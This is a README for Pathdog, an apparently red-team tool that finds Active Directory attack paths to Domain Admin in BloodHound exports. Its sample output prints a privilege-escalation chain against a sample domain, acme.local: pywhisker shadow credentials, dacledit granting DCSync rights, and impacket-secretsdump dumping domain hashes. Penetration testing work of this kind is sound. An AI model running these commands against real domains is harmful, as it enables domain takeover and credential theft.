# Pathdog

Parse a BloodHound ZIP export, find attack paths to Domain Admin, and print
the exact commands to run at every hop. No Neo4j, no GUI, no depth limit.

## Install

```bash
git clone https://github.com/Dikabraxis/Pathdog.git
cd Pathdog
pip install -r requirements.txt
```

Python 3.10+.

## Usage

```
python pathdog.py -z <dump.zip> -u <user> [options]
```

| Flag | Description |
|------|-------------|
| `-z FILE [FILE ...]` | BloodHound ZIP export(s). Multiple ZIPs are merged. |
| `-u USER [USER ...]` | Owned user(s). Accepts `name@domain.local` or a `.txt` file. |
| `-t TARGET` | Target node. Defaults to auto-detected `DOMAIN ADMINS`. |
| `-k N` | Number of paths per user (default `3`). |
| `-o BASENAME` | Output base name (default `pathdog_report`). |
| `-f md \| html \| both` | Report format (default `both`). |
| `-l KIND` | List nodes and exit. `KIND` = `users`, `computers`, `groups`, `domains`, `all`. |
| `-v` | Show graph statistics. |
| `--no-fallback` | Disable intermediate-target suggestions. |
| `--no-quickwins` | Disable the domain-wide quick-wins scan. |
| `--no-pivots` | Disable pivot-candidate scan. |
| `--fallback-top N` | Cap intermediate targets per user (default `10`). |
| `--pivots-top N` | Cap pivot candidates (default `15`). |

## Examples

```bash
# Basic, find paths from a single owned user
python pathdog.py -z corp.zip -u john.doe@corp.local

# Multiple ZIPs, multiple users (paths can cross-chain between them)
python pathdog.py -z dump1.zip dump2.zip -u alice@corp.local bob@corp.local

# Owned users from a text file (lines starting with # are ignored)
python pathdog.py -z corp.zip -u owned.txt -k 5 -f html -v

# Target a computer instead of DA
python pathdog.py -z corp.zip -u alice@corp.local -t DC01.corp.local

# Just inspect the dump without running pathfinding
python pathdog.py -z corp.zip --list users
python pathdog.py -z corp.zip --list all
```

## What you get

For each owned user, Pathdog produces a console summary plus a Markdown and
HTML report. The HTML report shows:

- **One-line verdict** at the top, path found, no path but pivot available,
  or nothing actionable.
- **Best path** with an ASCII chain overview, then each hop as a card with
  a plain-English title, what it means, the impact, and the exact commands
  to run as the current identity.
- **Pivot candidates** when no direct path exists, principals that already
  have a path to the target and can be compromised out-of-band (Kerberoast,
  AS-REP roast, weak password, LAPS, unconstrained delegation).
- **Domain-wide quick-wins** surfaced from BloodHound node properties:
  AS-REP roastables, Kerberoastables, unconstrained delegation, LAPS-
  deployed hosts, ADCS templates, password-not-required accounts, DCs.
- **Identity tracking**, commands at each hop use the identity you have
  *right now*, not the node label in the graph.

Example console output (best path + summary; full breakdown lives in the HTML report):

```
  ✓ john.doe@acme.local → DOMAIN ADMINS@acme.local   5 hops, weight 8 [DCSync]

    john.doe@acme.local
      └─[MemberOf]──► HELPDESK@acme.local
      └─[GenericWrite]──► svc_backup@acme.local
      └─[WriteDacl]──► acme.local
      └─[Contains]──► USERS@acme.local
      └─[Contains]──► DOMAIN ADMINS@acme.local

    # Step 1: GenericWrite on svc_backup@acme.local  (as john.doe@acme.local)
      $ pywhisker -d acme.local -u 'john.doe' -p '<SRC_PASSWORD>' --target 'svc_backup' --action add --dc-ip <DC_IP>
      → now operating as: svc_backup@acme.local

    # Step 2: WriteDacl on acme.local  (as svc_backup@acme.local)
      $ dacledit.py -action write -rights DCSync -principal 'svc_backup' -target-dn 'DC=acme,DC=local' 'acme.local/svc_backup:<SRC_PASSWORD>' -dc-ip <DC_IP>
      $ impacket-secretsdump -just-dc 'acme.local/svc_backup:<SRC_PASSWORD>@<DC_IP>'

    +2 more paths  →  see HTML report

  ◆ Best pivot: db_admin@acme.local (Kerberoast, 3 hops onward)

  ◆ Domain quick-wins:
      • High-value target (12)
      • Kerberoast (4)
      • AS-REP roast (2)
      • Unconstrained delegation (1)
      • Domain Controller (2)
    full details + commands  →  see HTML report
```

ANSI colors are emitted when stdout is a TTY (auto-disabled by `NO_COLOR=1`).

## Notes

- Both BloodHound legacy (v4) and BloodHound CE (v5+) ZIP formats are
  supported.
- Multiple ZIPs are merged into a single graph before pathfinding,
  duplicate nodes and edges are deduplicated automatically.
- Pathdog synthesizes a `DCSync` edge when a principal holds both
  `GetChanges` and `GetChangesAll` on the same domain. Either right alone
  is deprioritized (it isn't exploitable without the pair).
